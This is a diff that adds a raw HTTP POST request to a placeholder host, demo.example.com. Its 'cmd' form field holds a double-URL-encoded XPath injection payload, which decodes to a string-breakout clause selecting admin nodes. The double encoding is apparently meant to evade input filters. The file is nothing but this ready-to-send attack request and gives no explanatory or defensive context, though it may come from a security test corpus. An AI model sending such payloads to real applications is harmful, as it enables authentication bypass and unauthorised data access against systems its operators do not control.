@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 84
+Connection: close
+
+cmd=x%2527%2Bor%2B%252F%252Fadmin%255Bnot%2528text%2528%2529%2529%255D%2Bor%2B%2527y
